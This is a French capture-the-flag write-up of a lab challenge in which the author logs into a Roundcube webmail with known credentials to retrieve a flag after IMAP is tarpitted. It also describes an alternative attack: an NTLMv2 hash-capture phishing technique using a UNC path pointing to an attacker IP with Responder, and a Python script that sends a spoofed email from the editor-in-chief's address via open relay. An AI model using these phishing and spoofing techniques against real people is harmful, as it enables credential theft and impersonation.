---
title: "Human After All · Phishing SMTP"
platform: "HackerLab Benin 2026"
category: "misc"
difficulty: "—"
points: 0
os: "—"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/misc/human-after-all.md"
tags: [hackerlab-benin-2026, misc]
status: published
---

# Human After All : Misc · Phishing SMTP + Roundcube

**Catégorie** : misc  
**Flag** : `HLB2026{5da90efc56980d3486c132b09b4d26f9}`

## TL;DR

Mikkel Strand (`mstrand@tervalitribune.trv`) a un compte Roundcube avec son mot de passe `stranded`. Le webmail accepte la session là où IMAP la rejette (fail2ban/tarpit). Le flag est dans une identité configurée sur son compte, accessible via le panneau paramètres.

## Reconnaissance

Le réseau `172.28.3.0/24` expose deux services :
- `172.28.3.2` : SMTP/IMAP (Postfix/Dovecot)
- `172.28.3.4` : webmail Roundcube

La bannière IMAP révèle `Dovecot` avec `AUTH=PLAIN AUTH=LOGIN`.

## Connexion Roundcube

Une tentative IMAP directe avec `mstrand/stranded` retourne `AUTHENTICATIONFAILED` : le service est tarpité. La même paire de credentials passe sans problème via Roundcube :

```
http://172.28.3.4/
username: mstrand
password: stranded
```

## Flag dans les identités

Une fois connecté, le flag est dans le panneau des identités configurées :

```
/?_task=settings&_action=identities&_iid=3
```

L'identité id=3 contient le flag :

```
HLB2026{5da90efc56980d3486c132b09b4d26f9}
```

## Phishing NTLMv2 (technique alternative)

L'énoncé mentionne aussi un angle phishing UNC : envoyer via le SMTP open relay un mail avec une image référençant `\\<ATT_IP>\share\pixel.png`. Un Responder en écoute sur 139/445 capturait le hash NTLMv2 de `mstrand` lors de la résolution du chemin UNC.

```python
#!/usr/bin/env python3
import argparse, smtplib
from email.message import EmailMessage
from email.policy import SMTP

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="172.28.3.2")
    ap.add_argument("--to", default="mstrand@tervalitribune.trv")
    args = ap.parse_args()

    msg = EmailMessage(policy=SMTP)
    msg["From"] = "Antoine Mercier <a.mercier@tervalitribune.trv>"
    msg["To"] = args.to
    msg["Subject"] = "Peux-tu me rappeler rapidement ?"
    msg.set_content("""Strand,

Je dois te joindre rapidement au sujet du dossier Bellevue et d'une source.
Peux-tu me répondre avec le numéro auquel je peux te joindre aujourd'hui ?

Merci,
Antoine
Rédacteur en chef : Tervalis Tribune
""")
    with smtplib.SMTP(args.host, 25, timeout=20) as smtp:
        smtp.ehlo("redaction.tervalitribune.trv")
        smtp.send_message(msg, from_addr="a.mercier@tervalitribune.trv",
                          to_addrs=[args.to])
        print("sent", args.to)

if __name__ == "__main__":
    main()
```

Dans ce challenge, la voie Roundcube directe était plus rapide : le mot de passe était connu via OSINT et le login web n'était pas tarpité.

## À retenir

Fail2ban sur IMAP ne protège pas nécessairement le webmail Roundcube. Les deux surfaces partagent les mêmes credentials mais ont des mécanismes de protection indépendants.
